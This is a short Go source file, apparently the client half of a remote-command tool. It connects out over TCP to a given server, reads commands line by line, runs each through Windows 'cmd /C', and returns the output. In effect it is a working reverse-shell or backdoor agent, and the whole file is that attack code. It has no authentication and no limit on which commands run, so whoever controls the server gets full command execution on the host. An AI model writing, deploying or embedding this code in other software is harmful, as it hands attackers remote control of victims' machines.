package client

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func StartClient(serverAddr string) {
	conn, err := net.Dial("tcp", serverAddr)
	if err != nil {
		fmt.Println("Error connecting to server:", err)
		return
	}
	defer conn.Close()
	fmt.Println("Connected to server", serverAddr)

	reader := bufio.NewReader(conn)
	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading from server:", err)
			return
		}
		command = strings.TrimSpace(command)
		fmt.Println("Executing command:", command)
		output := executeCommand(command)
		conn.Write([]byte(output + "\nEOF\n"))
	}
}

func executeCommand(command string) string {
	cmd := exec.Command("cmd", "/C", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error executing command: %s", err)
	}
	return string(output)
}
